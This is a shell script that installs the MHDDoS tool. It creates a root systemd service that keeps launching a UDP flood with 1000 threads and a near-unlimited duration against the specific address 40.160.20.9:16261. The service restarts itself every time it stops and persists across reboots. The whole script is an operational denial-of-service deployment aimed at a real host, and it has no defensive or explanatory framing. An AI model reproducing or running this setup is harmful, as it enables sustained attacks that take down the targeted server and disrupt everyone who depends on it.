# 1. Install dependencies globally
sudo apt update && sudo apt install python3 python3-pip git -y

# 2. Go to the directory
cd /root/MHDDoS

# 3. Force install requirements globally
pip3 install --upgrade pip --break-system-packages
pip3 install -r requirements.txt --break-system-packages
pip3 install PyRoxy --break-system-packages

# 4. Create the service file using the GLOBAL python3
# We add PYTHONPATH to the environment so it CANNOT miss the modules
cat <<EOF | sudo tee /etc/systemd/system/mhddos.service
[Unit]
Description=MHDDoS Service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
User=root
WorkingDirectory=/root/MHDDoS
Environment=PYTHONPATH=/usr/local/lib/python3.12/dist-packages
ExecStart=/usr/bin/python3 start.py UDP 40.160.20.9:16261 1000 99999999999
Restart=always
RestartSec=5s
RuntimeMaxSec=10min

[Install]
WantedBy=multi-user.target
EOF

# 5. Reload and Start
sudo systemctl daemon-reload
sudo systemctl enable mhddos.service
sudo systemctl restart mhddos.service

echo "------------------------------------------------"
echo "Global Force Fix applied."
sleep 3
systemctl status mhddos.service
